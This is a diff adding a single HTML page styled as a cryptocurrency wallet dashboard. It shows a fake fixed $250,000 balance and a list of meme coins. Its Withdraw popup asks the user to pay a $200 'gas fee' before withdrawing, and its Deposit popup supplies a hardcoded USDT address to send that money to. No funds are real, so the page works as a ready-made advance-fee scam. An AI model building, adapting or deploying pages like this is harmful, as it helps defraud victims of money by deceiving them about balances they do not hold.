@@ -1,0 +1,335 @@
+<!doctype html>
+<html lang="en"> 
+ <head> 
+  <meta charset="UTF-8"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+  <title>Dashboard</title> 
+  <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #121212;
+            color: #ffffff;
+        }
+        .container {
+            padding: 20px;
+        }
+        .header {
+            text-align: center;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        .balance {
+            text-align: center;
+            font-size: 20px;
+            margin-bottom: 20px;
+        }
+        .button-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .button-grid button {
+            background-color: #F3BA2F;
+            color: #000;
+            border: none;
+            padding: 15px 20px;
+            cursor: pointer;
+            font-size: 16px;
+            border-radius: 8px;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .button-grid button i {
+            font-size: 18px;
+        }
+        .popup {
+            background-color: #1E1E1E;
+            color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 20px;
+            display: none;
+            font-size: 16px;
+            line-height: 1.6;
+        }
+        .popup h3 {
+            margin-top: 0;
+            color: #F3BA2F;
+        }
+        .usdt-address {
+            font-size: 14px;
+            padding: 10px;
+            background-color: #333;
+            border-radius: 5px;
+            margin-top: 10px;
+            display: inline-block;
+            word-break: break-all;
+        }
+        .copy-btn {
+            background-color: #F3BA2F;
+            color: #000;
+            border: none;
+            padding: 8px 15px;
+            cursor: pointer;
+            font-size: 14px;
+            border-radius: 5px;
+            margin-top: 10px;
+        }
+        .withdraw-btn {
+            background-color: #F3BA2F;
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-size: 16px;
+            border-radius: 5px;
+            margin-top: 10px;
+        }
+        .gas-fee-message {
+            color: #F3BA2F;
+            font-size: 16px;
+            margin-top: 10px;
+            display: none;
+            text-align: center;
+        }
+        .coins-list {
+            margin-top: 20px;
+        }
+        .coin {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 20px;
+            background-color: #1E1E1E;
+            border-radius: 8px;
+            margin-bottom: 10px;
+        }
+        .coin-name {
+            font-weight: bold;
+        }
+        .coin-balance {
+            color: #F3BA2F;
+        }
+    </style> 
+  <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script> 
+ </head> 
+ <body> 
+  <div class="container"> 
+   <div class="header">
+     Dashboard 
+   </div> 
+   <div class="balance">
+     Balance: $250,000 
+   </div> 
+   <div class="button-grid"> <button onclick="showPopup('deposit')"><i class="fas fa-wallet"></i> Deposit</button> <button onclick="showPopup('withdraw')"><i class="fas fa-arrow-up"></i> Withdraw</button> <button onclick="showPopup('balance')"><i class="fas fa-money-bill"></i> Balance</button> <button onclick="showPopup('history')"><i class="fas fa-history"></i> History</button> 
+   </div> 
+   <div id="popup-deposit" class="popup"> 
+    <h3>Deposit</h3> Send only USDT asset to this address: 
+    <div class="usdt-address">TSGsDZdMCtuCGP27QaawA1bZfFQKgXrH2z 
+    </div> <button class="copy-btn" onclick="copyAddress()">Copy</button> 
+   </div> 
+   <div id="popup-withdraw" class="popup"> 
+    <h3>Withdraw</h3> Nothing less than $250,000 can be withdrawn from this account, but you need a gas fee of $200 to proceed. 
+    <div>
+      Amount to withdraw: <b>$250,000</b> 
+    </div> 
+    <div>
+      Enter your USDT address: 
+     <input type="text" placeholder="Enter USDT address" style="width: 100%; padding: 10px; margin-top: 10px; border-radius: 5px; border: none; background-color: #333; color: #fff;"> 
+    </div> <button class="withdraw-btn" onclick="displayGasFeeMessage()">Withdraw</button> 
+    <div class="gas-fee-message" id="gas-fee-message">
+      Please deposit $200 gas fee to withdraw. 
+    </div> 
+   </div> 
+   <div id="popup-balance" class="popup"> 
+    <h3>Balance</h3> Your current balance is <b>$250,000</b>. 
+   </div> 
+   <div id="popup-history" class="popup"> 
+    <h3>History</h3> No recent trade. 
+   </div> 
+   <div class="coins-list"> 
+    <h3>Meme Coins</h3> <!-- 20 Meme coins with $0.00 balance --> 
+    <div class="coin"> 
+     <div class="coin-name">
+       Dogecoin 
+     </div> 
+     <div class="coin-balance">
+       $0.00 
+     </div> 
+    </div> 
+    <div class="coin"> 
+     <div class="coin-name">
+       Shiba Inu 
+     </div> 
+     <div class="coin-balance">
+       $0.00 
+     </div> 
+    </div> 
+    <div class="coin"> 
+     <div class="coin-name">
+       PepeCoin 
+     </div> 
+     <div class="coin-balance">
+       $0.00 
+     </div> 
+    </div> 
+    <div class="coin"> 
+     <div class="coin-name">
+       Floki Inu 
+     </div> 
+     <div class="coin-balance">
+       $0.00 
+     </div> 
+    </div> 
+    <div class="coin"> 
+     <div class="coin-name">
+       SafeMoon 
+     </div> 
+     <div class="coin-balance">
+       $0.00 
+     </div> 
+    </div> 
+    <div class="coin"> 
+     <div class="coin-name">
+       Kishu Inu 
+     </div> 
+     <div class="coin-balance">
+       $0.00 
+     </div> 
+    </div> 
+    <div class="coin"> 
+     <div class="coin-name">
+       Hoge Finance 
+     </div> 
+     <div class="coin-balance">
+       $0.00 
+     </div> 
+    </div> 
+    <div class="coin"> 
+     <div class="coin-name">
+       Akita Inu 
+     </div> 
+     <div class="coin-balance">
+       $0.00 
+     </div> 
+    </div> 
+    <div class="coin"> 
+     <div class="coin-name">
+       Elon Musk Doge Token 
+     </div> 
+     <div class="coin-balance">
+       $0.00 
+     </div> 
+    </div> 
+    <div class="coin"> 
+     <div class="coin-name">
+       CateCoin 
+     </div> 
+     <div class="coin-balance">
+       $0.00 
+     </div> 
+    </div> 
+    <div class="coin"> 
+     <div class="coin-name">
+       FantomCoin 
+     </div> 
+     <div class="coin-balance">
+       $0.00 
+     </div> 
+    </div> 
+    <div class="coin"> 
+     <div class="coin-name">
+       Tiger King Coin 
+     </div> 
+     <div class="coin-balance">
+       $0.00 
+     </div> 
+    </div> 
+    <div class="coin"> 
+     <div class="coin-name">
+       Pitbull Coin 
+     </div> 
+     <div class="coin-balance">
+       $0.00 
+     </div> 
+    </div> 
+    <div class="coin"> 
+     <div class="coin-name">
+       MonaCoin 
+     </div> 
+     <div class="coin-balance">
+       $0.00 
+     </div> 
+    </div> 
+    <div class="coin"> 
+     <div class="coin-name">
+       DogeFather 
+     </div> 
+     <div class="coin-balance">
+       $0.00 
+     </div> 
+    </div> 
+    <div class="coin"> 
+     <div class="coin-name">
+       ShibaPup 
+     </div> 
+     <div class="coin-balance">
+       $0.00 
+     </div> 
+    </div> 
+    <div class="coin"> 
+     <div class="coin-name">
+       Woofy 
+     </div> 
+     <div class="coin-balance">
+       $0.00 
+     </div> 
+    </div> 
+    <div class="coin"> 
+     <div class="coin-name">
+       Dogelon Mars 
+     </div> 
+     <div class="coin-balance">
+       $0.00 
+     </div> 
+    </div> 
+    <div class="coin"> 
+     <div class="coin-name">
+       Banana Token 
+     </div> 
+     <div class="coin-balance">
+       $0.00 
+     </div> 
+    </div> 
+    <div class="coin"> 
+     <div class="coin-name">
+       PoodleCoin 
+     </div> 
+     <div class="coin-balance">
+       $0.00 
+     </div> 
+    </div> 
+   </div> 
+  </div> 
+  <script>
+        function showPopup(type) {
+            document.querySelectorAll('.popup').forEach(popup => popup.style.display = 'none');
+            document.getElementById(`popup-${type}`).style.display = 'block';
+        }
+
+        function copyAddress() {
+            const address = document.querySelector('.usdt-address').textContent;
+            navigator.clipboard.writeText(address).then(() => alert('Address copied to clipboard!'));
+        }
+
+        function displayGasFeeMessage() {
+            const message = document.getElementById('gas-fee-message');
+            message.style.display = 'block';
+        }
+    </script> 
+ 
+</body></html>
